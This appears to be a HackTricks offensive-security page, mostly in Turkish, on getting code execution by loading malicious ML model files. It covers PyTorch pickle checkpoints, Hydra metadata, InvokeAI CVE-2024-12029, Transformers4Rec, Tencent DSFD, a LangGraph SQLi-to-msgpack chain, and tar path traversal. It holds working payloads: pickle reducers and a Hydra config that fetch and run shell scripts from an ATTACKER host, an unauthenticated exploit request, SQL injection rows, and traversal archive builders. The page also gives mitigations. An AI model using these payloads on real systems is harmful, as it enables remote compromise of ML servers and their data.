# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. gibi farklı formatlarda paylaşılır. Bu modeller, kullanılmak üzere geliştirici makinelerine veya production sistemlerine yüklenebilir. Normalde modellerin kötü amaçlı kod içermemesi gerekir, ancak modelin sistemde keyfi kod çalıştırmak için kullanılabildiği bazı durumlar vardır; bu ya amaçlanan bir özellik olarak ya da model yükleme kütüphanesindeki bir vulnerability nedeniyle olur.

Yazım anında bu tür vulneravilities için bazı örnekler şunlardır:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` bir yapılandırma/metadata nesnesindeki noktalı herhangi bir `_target_` değerini import eder ve çağırır. Kütüphaneler **güvenilmeyen model metadata** verisini `instantiate()` içine aktardığında, bir saldırgan yükleme sırasında hemen çalışan bir callable ve argümanlar verebilir (pickle gerekmez).

Payload örneği (`.nemo` `model_config.yaml`, repo `config.json`, veya `.safetensors` içindeki `__metadata__` ile çalışır):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok yükleyicilerinde model başlatılmadan önce tetiklenir.
- Hydra’nın string block-list’i alternatif import path’ler (ör. `enum.bltns.eval`) veya uygulama tarafından çözümlenen isimler (ör. `nemo.core.classes.common.os.system` → `posix`) üzerinden bypass edilebilir.
- FlexTok ayrıca string haline getirilmiş metadata’yı `ast.literal_eval` ile ayrıştırır, bu da Hydra çağrısından önce DoS’a (CPU/memory blowup) yol açabilir.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir açık kaynak web arayüzüdür. **5.3.1 – 5.4.2** sürümleri, kullanıcıların arbitary URL’lerden model indirmesine ve yüklemesine izin veren `/api/v2/models/install` REST endpoint’ini açığa çıkarır.

Dahili olarak bu endpoint sonunda şunu çağırır:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Supplied file bir **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` bir **pickle deserialization** gerçekleştirir. İçerik doğrudan user-controlled URL’den geldiği için, bir attacker checkpoint içine custom `__reduce__` metoduna sahip malicious bir object yerleştirebilir; method **deserialization sırasında** çalıştırılır ve InvokeAI server üzerinde **remote code execution (RCE)** ile sonuçlanır.

Vulnerability’ye **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) atandı.

#### Exploitation walk-through

1. Malicious bir checkpoint oluşturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` dosyasını kontrol ettiğiniz bir HTTP sunucusunda barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Güvenlik açığı bulunan endpoint’i tetikleyin (kimlik doğrulama gerekmez):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayı indirdiğinde `torch.load()` çağırır → `os.system` gadget çalışır ve saldırgan InvokeAI süreci bağlamında kod yürütme elde eder.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  Saldırgan tarafından erişilebilir `/api/v2/models/install`
•  Süreç shell komutlarını çalıştırma izinlerine sahip

#### Mitigations

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama `scan=True` değerini varsayılan olarak ayarlar ve deserialize etmeden önce malware scanning yapar.
* Checkpoint’leri programatik olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper’ını kullanın.
* Model kaynakları için allow-list/signature zorlayın ve servisi least-privilege ile çalıştırın.

> ⚠️ Unutmayın ki **herhangi** bir Python pickle-based formatı (`.pt`, `.pkl`, `.ckpt`, `.pth` dosyalarının çoğu dahil) güvenilmeyen kaynaklardan deserialize etmek için doğası gereği güvensizdir.

---

Eski InvokeAI sürümlerini reverse proxy arkasında çalışır halde tutmanız gerekiyorsa, isteğe bağlı bir mitigation örneği:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec unsafe `torch.load` üzerinden RCE (CVE-2025-23298)

NVIDIA’nın Transformers4Rec’i (Merlin’in bir parçası), kullanıcı tarafından sağlanan yollarda doğrudan `torch.load()` çağıran güvensiz bir checkpoint loader açığa çıkardı. `torch.load`, Python `pickle`’a dayandığı için, saldırgan kontrolündeki bir checkpoint deserialization sırasında bir reducer üzerinden rastgele kod çalıştırabilir.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: Python pickle içinde bir nesne, bir callable ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Bu callable, unpickling sırasında çalıştırılır. Böyle bir nesne bir checkpoint içinde bulunursa, herhangi bir ağırlık kullanılmadan önce çalışır.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Dağıtım vektörleri ve blast radius:
- Repo, bucket veya artifact registries üzerinden paylaşılan Trojanized checkpoints/models
- Checkpoint'leri otomatik olarak yükleyen otomated resume/deploy pipelines
- Execution training/inference workers içinde gerçekleşir, çoğu zaman yükseltilmiş privileges ile (ör. containers içinde root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) doğrudan `torch.load()` yerine `transformers4rec/utils/serialization.py` içinde uygulanan kısıtlı, allow-listed bir deserializer ile değiştirildi. Yeni loader type/field’ları doğrular ve load sırasında keyfi callables çağrılmasını engeller.

PyTorch checkpoints için özel defensive guidance:
- Untrusted data’yı unpickle etmeyin. Mümkün olduğunda [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi non-executable formatları tercih edin.
- PyTorch serialization kullanmak zorundaysanız, `weights_only=True` (yeni PyTorch sürümlerinde desteklenir) kullanın veya Transformers4Rec patch’ine benzer custom allow-listed bir unpickler kullanın.
- Model provenance/signatures uygulayın ve deserialization’ı sandbox edin (seccomp/AppArmor; non-root user; restricted FS ve no network egress).
- Checkpoint load zamanında ML services’ten beklenmeyen child processes olup olmadığını izleyin; `torch.load()`/`pickle` kullanımını trace edin.

POC ve vulnerable/patch referansları:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Modeli oluşturun:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yükle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD `resnet` endpoint, kullanıcı kontrollü veriyi deserialize eder. ZDI, uzak bir saldırganın kurbanı kötü amaçlı bir sayfa/dosya yüklemeye ikna edip, bunun bu endpoint’e özel hazırlanmış serialized blob göndermesini sağlayabileceğini ve `root` olarak deserialization tetikleyerek tam ele geçirme elde edebileceğini doğruladı.

Exploit akışı tipik pickle abuse ile aynıdır:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Deserialization sırasında erişilebilen herhangi bir gadget (constructors, `__setstate__`, framework callbacks, vb.), transport HTTP, WebSocket ya da izlenen bir dizine bırakılan bir file olsun fark etmeksizin, aynı şekilde weaponized edilebilir.



### LangGraph checkpointer SQLi → MessagePack RCE

Bu attack chain ilginçtir çünkü attacker **kötü amaçlı bir model file yüklemek zorunda değildir**. Bunun yerine, application bir **AI-agent persistence API** (`get_state_history(..., filter=...)`) expose eder ve user input checkpointer query builder’a ulaşır.

#### 1. Metadata filters içinde yapısal SQLi

Vulnerable bir SQLite pattern şu şekilde görünüyordu:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Değer daha sonra bağlanır, ancak `query_key` **JSON path string** içine birleştirilir; bu yüzden dictionary key içindeki bir `'`, `'$.{query_key}'` içinden çıkıp SQL enjekte eder. Aynı ders **JSON path’leri, identifier’lar, operator’lar, `LIMIT` ve TTL fields** için de geçerlidir: placeholder’lar yalnızca values’ları korur, structural query syntax’i değil.

#### 2. `UNION SELECT` sadece data theft için değil, downstream sinks için de hedef olabilir

Query `type` ve serialized `checkpoint` bytes döndürür, bunlar daha sonra şu şekilde tüketilir:
```python
self.serde.loads_typed((type, checkpoint))
```
Bu, `WHERE` maddesindeki bir SQLi’nin bir **sahte sonuç satırı** enjekte edebileceği anlamına gelir:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Eğer daha sonra kod herhangi bir seçili sütunu parse eder, deserialize eder, yazar veya çalıştırırsa, bu sütunları onların sink’lerine eşleyin. Bu durumda sahte satır SQLi’yi **saldırgan kontrollü deserialization**'a dönüştürür.

#### 3. Unsafe MessagePack extension hooks code gadget’larına eşdeğerdir

LangGraph'ın `msgpack` path’i, iç içe bir tuple'ı unpack eden ve çalıştıran özel bir extension hook kullandı:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Yani, `("os", "system", "id > /tmp/pwned")` ile eşdeğer bir MessagePack extension object encoding, `os`'u import eder, `system`'i çözer ve komutu çalıştırır. AI framework'leri incelerken, dinamik imports, reflection veya arbitrary callable dispatch için **custom MessagePack/JSON/pickle revivers**'ı kontrol edin.

#### 4. Agent framework'leri için pratik audit deseni

Kullanıcı kontrollü herhangi bir input'un ulaştığı yerleri inceleyin:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders that generate SQL or Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- persistence layer'dan dönen satırları güvenilir sayan recovery yolları

Bu belirli zincir, untrusted kullanıcılar `filter`'ı kontrol edebildiğinde **SQLite** veya **Redis** checkpointers kullanan self-hosted LangGraph deployment'larını etkiledi. Disclosure'da belirtilen patched versions şunlardı: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, ve `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

[**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) içinde yorumlandığı gibi, farklı AI framework'leri tarafından kullanılan çoğu model formatı archive'lara dayanır, genellikle `.zip`. Bu nedenle, bu formatları abuse ederek path traversal saldırıları gerçekleştirmek ve modelin yüklendiği sistemden arbitrary files okumak mümkün olabilir.

Örneğin, aşağıdaki code ile yüklendiğinde `/tmp` dizininde bir file oluşturacak bir model yaratabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Veya, aşağıdaki kod ile yüklendiğinde `/tmp` dizinine bir symlink oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Derin inceleme: Keras .keras deserialization ve gadget hunting

.keras iç yapıları, Lambda-layer RCE, ≤ 3.8 sürümündeki arbitrary import sorunu ve allowlist içindeki düzeltme sonrası gadget keşfi için, bakın:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Kaynaklar

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – torch.load için security considerations](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
